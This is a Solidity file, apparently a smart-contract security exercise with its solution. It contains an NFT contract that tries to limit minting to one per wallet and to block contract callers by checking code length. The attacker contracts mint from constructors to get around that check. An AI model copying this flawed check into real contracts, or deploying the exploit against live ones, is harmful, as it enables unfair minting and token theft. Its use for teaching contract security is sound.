// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";


contract Overmint3 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(msg.sender.code.length == 0, "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }
}


contract Attacker {
    Overmint3 public overmint3;

    constructor(address _overmint3, address attacker) {
        overmint3 = Overmint3(_overmint3);
        overmint3.mint();
        overmint3.safeTransferFrom(address(this), attacker, overmint3.totalSupply());
    }
}

contract AttackerDeployer {
    uint256 counter = 0;

    constructor(address _overmint3, address _attacker) {
        while (counter < 5) {
            counter++;
            new Attacker(_overmint3, _attacker);
        }
    }
}